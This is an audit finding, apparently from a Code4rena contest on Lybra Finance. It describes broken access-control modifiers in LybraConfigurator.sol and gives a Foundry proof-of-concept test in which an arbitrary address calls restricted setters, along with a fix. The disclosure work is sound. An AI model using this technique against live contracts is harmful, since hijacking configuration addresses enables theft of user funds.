---
# Core Classification
protocol: Lybra Finance
chain: everychain
category: access_control
vulnerability_type: access_control

# Attack Vector Details
attack_type: access_control
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 21140
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-06-lybra
source_link: https://code4rena.com/reports/2023-06-lybra
github_link: https://github.com/code-423n4/2023-06-lybra-findings/issues/704

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:
  - access_control

# Audit Details
report_date: unknown
finders_count: 24
finders:
  - josephdara
  - Timenov
  - mahyar
  - alexweb3
  - zaggle
---

## Vulnerability Title

[H-03] Incorrectly implemented modifiers in `LybraConfigurator.sol` allow any address to call functions that are supposed to be restricted

### Overview


This bug report is related to the LybraFinance project. Two modifiers, `onlyRole` (bytes32 role) and `checkRole` (bytes32 role), are not correctly implemented and thus allow anyone to call sensitive functions that should be restricted. A Proof of Concept (PoC) was created to demonstrate this vulnerability. The PoC code was written in Solidity and tested to show that a random address can call sensitive functions. The recommended mitigation steps are to wrap the two function calls in a require statement. This bug is classified as an Access Control vulnerability. LybraFinance has confirmed the bug report.

### Original Finding Content


The modifiers `onlyRole` (bytes32 role) and `checkRole` (bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.

### Proof of Concept

For the POC, I set up a new foundry projects and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a file `POCs.t.sol` in the test folder. Here is the code that shows a random address can call sensitive functions that should be restricted:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/lybra/configuration/LybraConfigurator.sol";
import "../src/lybra/governance/GovernanceTimelock.sol";
import "../src/lybra/miner/esLBRBoost.sol";

contract POCsTest is Test {
    Configurator public lybraConfigurator;
    GovernanceTimelock public governance;
    esLBRBoost public boost;

    address public dao = makeAddr("dao");
    address public curvePool = makeAddr("curvePool");
    address public randomUser = makeAddr("randomUser");
    address public admin = makeAddr("admin");

    address public eusd = makeAddr("eusd");
    address public pEusd = makeAddr("pEusd");

    address proposerOne = makeAddr("proposerOne");
    address executorOne = makeAddr("executorOne");

    address[] proposers = [proposerOne];
    address[] executors = [executorOne];

    address public rewardsPool = makeAddr("rewardsPool");

    function setUp() public {
        governance = new GovernanceTimelock(10000, proposers, executors, admin);
        lybraConfigurator = new Configurator(address(governance), curvePool);
        boost = new esLBRBoost();
    }

    function testIncorrectlyImplementedModifiers() public {
        console.log("EUSD BEFORE", address(lybraConfigurator.EUSD()));
        vm.prank(randomUser);
        lybraConfigurator.initToken(eusd, pEusd);
        console.log("EUSD AFTER", address(lybraConfigurator.EUSD()));

        console.log("RewardsPool BEFORE", address(lybraConfigurator.lybraProtocolRewardsPool()));
        vm.prank(randomUser);
        lybraConfigurator.setProtocolRewardsPool(rewardsPool);
        console.log("RewardsPool AFTER", address(lybraConfigurator.lybraProtocolRewardsPool()));
    }
}
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

Wrap the 2 function calls in a require statement:

In modifier `onlyRole` (bytes32 role), instead of `GovernanceTimelock.checkOnlyRole` (role, msg.sender), it should be something like require (`GovernanceTimelock.checkOnlyRole` (role, msg.sender), "Not Authorized").

The same goes for the `checkRole` (bytes32 role) modifier.

### Assessed type

Access Control

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/704#issuecomment-1635551912)**

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Lybra Finance |
| Report Date | N/A |
| Finders | josephdara, Timenov, mahyar, alexweb3, zaggle, zaevlad, Neon2835, cartlex\_, DelerRH, LuchoLeonel1, mrudenko, lanrebayode77, Silvermist, koo, D\_Auditor, mladenov, TorpedoPistolIXC41, pep7siup, DedOhWale, Musaka, adeolu, hals |

### Source Links

- **Source**: https://code4rena.com/reports/2023-06-lybra
- **GitHub**: https://github.com/code-423n4/2023-06-lybra-findings/issues/704
- **Contest**: https://code4rena.com/reports/2023-06-lybra

### Keywords for Search

`Access Control`

